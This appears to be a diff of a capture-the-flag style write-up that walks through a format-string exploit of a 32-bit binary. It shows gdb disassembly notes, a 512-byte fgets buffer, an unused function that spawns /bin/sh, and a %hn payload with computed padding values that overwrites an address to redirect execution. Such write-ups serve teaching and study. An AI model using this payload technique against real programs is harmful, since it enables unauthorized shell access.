@@ -55,8 +55,11 @@ End of assembler dump.
    0x080484e5 <+35>:    call   0x80483a0 <fgets@plt>
 ```
 >`0x8049848 <stdin@@GLIBC_2.0>: 0xb7fd1ac0`
+
 >buffer size is 0x200 bytes
+
 >buffer starts at `-0x208(%ebp)`
+
 >Prompt the user for up to 512 bytes.
 
 ```
@@ -116,9 +119,13 @@ End of assembler dump.
 
 - Look! A function that is not called anywhere but calls `system("/bin/sh")`! By putting the value `0804 84a4` into `0x8049838`, the program's execution should be redirected to this function.
 >Low order bytes = 84a4 (33 956 in decimal)
+
 >High order bytes = 0804 (2052 in decimal)
+
 >`\x40\x98\04\x08\x38\x98\x04\x08 %VALUE1x %4$hn %VALUE2x %5$hn`
+
 >`VALUE1 (0x8049840)` ==> 2052 - 8 bytes for the addresses - 2 bytes for the spaces = 2042
+
 >`VALUE2 (0x8049838)` ==> 33 956 - 2052 - 2 bytes for the spaces = 31 902
 
 - So:
